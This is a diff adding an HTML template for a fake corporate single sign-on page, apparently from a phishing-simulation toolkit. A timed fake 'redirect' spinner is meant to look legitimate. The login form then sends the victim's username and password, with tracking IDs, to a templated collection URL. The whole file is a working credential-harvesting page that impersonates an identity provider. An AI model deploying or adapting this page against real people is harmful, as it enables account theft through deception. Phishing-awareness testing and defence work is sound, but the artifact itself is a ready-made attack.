@@ -1,0 +1,81 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Signing in&hellip;</title>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="sso-shell">
+  <div class="sso-card" id="sso-card">
+    <div class="sso-org">[Your Organization]</div>
+    <div id="stage-redirect">
+      <div class="spinner"></div>
+      <div class="sso-title">Redirecting to [IdP-Brand]&hellip;</div>
+      <p class="sso-sub">For your security, we're verifying your identity through your organization's identity provider.</p>
+    </div>
+    <div id="stage-form" style="display:none">
+      <h1 class="sso-title">Sign in to continue</h1>
+      <p class="sso-sub">Use your work account to access the requested resource.</p>
+      <form id="sso-form" autocomplete="off">
+        <div class="sso-field">
+          <label for="username">Email or username</label>
+          <input type="text" id="username" name="username" autocomplete="username" required>
+        </div>
+        <div class="sso-field">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" autocomplete="current-password" required>
+        </div>
+        <button type="submit" class="sso-submit">Continue</button>
+      </form>
+      <div class="sso-meta">By signing in you agree to your organization's usage policy.</div>
+    </div>
+  </div>
+</div>
+
+<script data-tracker src="{{TRACKER_URL}}"></script>
+<script>
+(function () {
+  var POST_URL = "{{POST_URL}}";
+  function trackerCtx() {
+    var t = window.__taphish_tracker || {};
+    var q = new URLSearchParams(location.search);
+    return {
+      rid: t.rid || q.get("rid") || "",
+      sess_id: t.session_id || q.get("sess_id") || "",
+      trackerId: t.tracker_id || q.get("trackerId") || "",
+    };
+  }
+  // 1.2s spinner — short enough to keep the user engaged, long enough
+  // to feel like a real redirect handshake.
+  setTimeout(function () {
+    document.getElementById("stage-redirect").style.display = "none";
+    document.getElementById("stage-form").style.display = "block";
+  }, 1200);
+
+  document.getElementById("sso-form").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var ctx = trackerCtx();
+    fetch(POST_URL, {
+      method: "POST",
+      mode: "cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        page: 1,
+        form_field_data: {
+          username: document.getElementById("username").value,
+          password: document.getElementById("password").value,
+        },
+        rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId,
+      }),
+    }).then(function () {
+      location.href = "https://example.com/";
+    }, function () {
+      location.href = "https://example.com/";
+    });
+  });
+})();
+</script>
+</body>
+</html>
